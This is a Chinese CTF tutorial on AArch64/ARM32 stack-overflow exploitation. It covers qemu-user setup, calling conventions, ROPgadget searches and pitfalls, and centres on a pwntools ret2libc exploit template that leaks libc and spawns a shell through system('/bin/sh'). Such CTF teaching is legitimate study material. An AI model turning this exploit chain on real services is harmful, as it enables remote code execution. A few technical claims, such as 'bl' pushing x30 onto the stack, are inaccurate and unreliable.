---
title: ARM / AArch64 pwn 入门 —— 交叉编译、ARM 汇编要点与 ROP 构造
category: pwn
tags: [ARM, AArch64, ROP, qemu-user, 交叉编译]
signals: [file 显示 ARM aarch64 或 arm 32 位小端, 题目只给一个 elf 没有给运行环境, 需要 qemu-arm 或 qemu-aarch64 才能运行, 没有 system 但有很多 pop 和 bx 指令, 返回值放在 x0 或 r0 寄存器而不是栈上, 题目附带 libc.so.6 是 aarch64 版本]
difficulty: medium
source: "CTF-Wiki ARM ROP / Azeria Labs ARM shellcode / AAPCS64"
tools: [pwntools, qemu-user, gdb-multiarch, ROPgadget, arm-linux-gnueabihf-gcc]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- `file ./pwn` 输出 `ELF 64-bit LSB executable, ARM aarch64`，或 `ELF 32-bit LSB executable, ARM, EABI5`。
- 没有配套运行时，直接执行会 `Exec format error` —— 必须用 `qemu-aarch64 -L ./`。
- 反汇编里出现 `x0 ~ x30`（AArch64）或 `r0 ~ r15` + `bx lr`（ARM32）。
- 函数返回走 `ret`（`x30`）/ `pop {r4, pc}`（ARM32），**返回地址不一定在栈顶**。
- 赠品里有 `libc.so.6`（aarch64 版本，约 1MB+）与 `ld-linux-aarch64.so.1`。
- 栈溢出后 `PC` 被覆盖成 `0x61616161`（4 字节对齐），且栈对齐是 **16 字节**。

## 二、原理

### 1. AArch64（64 位 ARM）关键点

| 概念 | x86-64 | AArch64 |
| --- | --- | --- |
| 调用约定参数 | `rdi, rsi, rdx...` | `x0, x1, x2, ..., x7` |
| 返回值 | `rax` | `x0`（`x1` 为次返回） |
| 返回地址 | 压在栈上 | **`x30`（LR）**，函数开头 `stp x29, x30, [sp, #-0x10]!` 保存 |
| 返回指令 | `ret`（从栈弹） | `ret`（跳到 `x30`） |
| 栈对齐 | 16 字节 | 16 字节（`sp & 0xf == 0`） |
| 系统调用 | `syscall`，`rax + rdi..` | `svc #0`，`x8` 放调用号，`x0~x5` 放参数 |

溢出后通常覆盖到「保存的 `x30`」，即 `ret` 会跳到我们写入的地址。第一个 gadget 常用：

```asm
ldp x19, x20, [sp, #0x10]   ; 从栈取
ldr x0, [sp, #0x50]         ; 取第一个参数
blr x3                      ; 调用
```

### 2. ARM32 关键点

| 概念 | 说明 |
| --- | --- |
| 参数 | `r0, r1, r2, r3`，第 5 个起走栈 |
| 返回 | `r0` |
| 返回地址 | `lr`（`r14`），或 `pop {r4, pc}` 从栈取 |
| 指令集 | ARM / Thumb 混用，地址最低位 `1` 表示 Thumb |
| 栈对齐 | 8 字节（`sp & 7 == 0`） |
| gadget 结尾 | `pop {r0, r1, r2, r3, pc}` / `bx lr` |

ARM32 的 ROP 极难找到「干净」的 `pop {r0, pc}`，常用的是 `__libc_csu_init` 风格的批量弹栈。

### 3. 为什么需要 `ROPgadget --arch`

x86 的 gadget 是字节序列切片（`pop rdi; ret` 可以从任意字节开始），ARM 是**定长指令**（4 字节，Thumb 2 字节），
因此 gadget 必须是真实指令边界上的指令组合，搜索方式完全不同：

```bash
ROPgadget --binary ./pwn --arch arm64 --only "ldp|ldr|mov|blr|svc"
ROPgadget --binary ./pwn --arch arm   --only "pop|bx|blx"
```

### 4. `qemu-user` 的降级（`-L` 指定 sysroot）

```bash
qemu-aarch64 -L ./lib ./pwn        # -L 让 qemu 在 ./lib 里找 ld-linux-aarch64.so.1
qemu-aarch64 -g 1234 ./pwn         # -g 开启 gdbserver，端口 1234
```

## 三、解题步骤

1. **确认架构与保护**
   ```bash
   file ./pwn
   checksec --file=./pwn
   ```
2. **准备运行环境**
   ```bash
   apt install qemu-user gdb-multiarch gcc-aarch64-linux-gnu
   qemu-aarch64 -L . ./pwn
   ```
3. **量溢出偏移**：`cyclic 200 > in; qemu-aarch64 -L . ./pwn < in`，
   `gdb-multiarch` 里看 `$x30` / `$pc`。
4. **找 gadget**：`ROPgadget --arch arm64`，确认有 `ldp` + `blr` 组合（AArch64 通常靠 `csu` 风格）。
5. **泄漏 libc**：`puts@plt(x0 = puts@got)`，之后 `system("/bin/sh")`。
6. **注意栈对齐**：AArch64 的 `bl` 会把 `x30` 压栈，脚本里多塞一个 `ret` 使 `sp` 16 对齐。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# AArch64 ret2libc 模板（qemu-user 本地 / 远程端口均可）
from pwn import *

context.binary = elf = ELF('./pwn')
context.arch = 'aarch64'
context.log_level = 'info'

libc = ELF('./libc.so.6')
OFFSET = 0x30                       # 到保存的 x30 的偏移（cyclic 量出）

def start():
    if args.REMOTE:
        return remote('HOST', 1337)
    return process(['qemu-aarch64', '-L', '.', './pwn'])

# ---------- AArch64 的 csu 风格 gadget（按题查偏移） ----------
# ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]
# ldp x23, x24, [sp, #0x30]; ldp x25, x26, [sp, #0x40]
# ldp x27, x28, [sp, #0x50]; ldp x29, x30, [sp, #0x60]
# ldr x0, [sp, #0x68]; ldr x1, [sp, #0x70]; ldr x2, [sp, #0x78]; blr x3
CSU_POP  = elf.sym['__libc_csu_init'] + 0x10   # pop 段
CSU_CALL = elf.sym['__libc_csu_init'] + 0x50   # call 段
RET      = elf.sym['__libc_csu_init'] + 0x08   # 只含 ret 的地址，用于对齐

io = start()

# ---------- 1. 泄漏 libc ----------
payload  = b'A' * OFFSET
payload += flat([
    CSU_POP, *([RET] * 11),     # x19 ~ x29 占位
    CSU_CALL,                   # x30 → 进入 call 段
    elf.got['puts'],            # x0 = puts@got（泄漏源）
    RET, RET, RET,              # x1 / x2 / x3 占位
    elf.plt['puts'],            # blr x3：调用 puts
    elf.sym['main'],            # 返回 main 做第二次交互
], word_size=64)

io.sendafter(b'input: ', payload)
io.recvuntil(b'\n')              # 跳过回显
leak = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']
log.success(f'libc = {hex(libc_base)}')

# ---------- 2. system("/bin/sh") ----------
system  = libc_base + libc.sym['system']
binsh   = libc_base + next(libc.search(b'/bin/sh\x00'))

payload  = b'A' * OFFSET
payload += flat([
    CSU_POP, *([RET] * 11),
    CSU_CALL,
    binsh, RET, RET, system,     # x0 = "/bin/sh"，x3 = system
    RET,                         # 保持 16 字节对齐
], word_size=64)

io.sendafter(b'input: ', payload)
io.interactive()
```

### ARM32（Thumb）最小骨架

```python
from pwn import *
context.binary = elf = ELF('./pwn32')
context.arch = 'arm'
# 找 gadget
# ROPgadget --binary ./pwn32 --arch arm --only "pop|bx"
POP_R0_R4_PC = 0x1234          # pop {r0, r4, pc}
OFFSET = 0x28

payload  = b'A' * OFFSET + flat([POP_R0_R4_PC, 0xdeadbeef, 0, elf.plt['puts']],
                                word_size=32)
# ARM32 的栈 8 字节对齐；Thumb 地址要 |1
```

## 五、常见坑 / 变体

1. **栈 16 字节对齐**：AArch64 的 `ldp/stp` 要求 `sp` 16 对齐，否则 `SIGBUS`。多插 `RET` 调整。
2. **`ret` 的目标是 `x30`**，不是 `[sp]`：溢出时覆盖的是函数序言里 `stp x29, x30` 落下的那一格。
3. **Thumb 位**：ARM32 跳转地址最低位为 `1` 表示 Thumb 模式；`bx r3` 是标准做法，`blx` 会改 `lr`。
4. **`svc #0` 的调用号约定**：AArch64 用 `x8`（`execve = 221`），ARM EABI 用 `r7`（`execve = 11`）。
5. **`qemu-user` 与真实内核有差异**：`-L` 忘写 → 找不到 `ld.so`；`-cpu max` 可启用更多指令。
6. **gdb-multiarch 需先 `set architecture aarch64`**，并 `target remote :1234` 连 qemu。
7. **`endbr` / PAC**：新版 GCC 可能启用 `-mbranch-protection=pac-ret`，函数尾变成
   `autiasp; ret`，此时无法直接 ROP，需要先关掉（题一般不开）。
8. **变体：SROP on AArch64** —— `rt_sigreturn` 也可以用，`sigcontext` 布局与 x86 不同。

## 六、参考来源

- [CTF-Wiki：ARM ROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/arm/rop/)
- [CTF-Wiki：ARM 环境搭建](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/arm/environment/)
- [Azeria Labs：Writing ARM64 Shellcode](https://azeria-labs.com/writing-arm-shellcode/)
- [Arm ABI：AAPCS64（调用约定权威文档）](https://github.com/arm-software/abi-aa/blob/main/aapcs64/aapcs64.rst)
- [QEMU 文档：man qemu-system / qemu-user 选项](https://www.qemu.org/docs/master/system/qemu-manpage.html)
- [ROPgadget（支持 `--arch arm64 / arm`）](https://github.com/JonathanSalwan/ROPgadget)
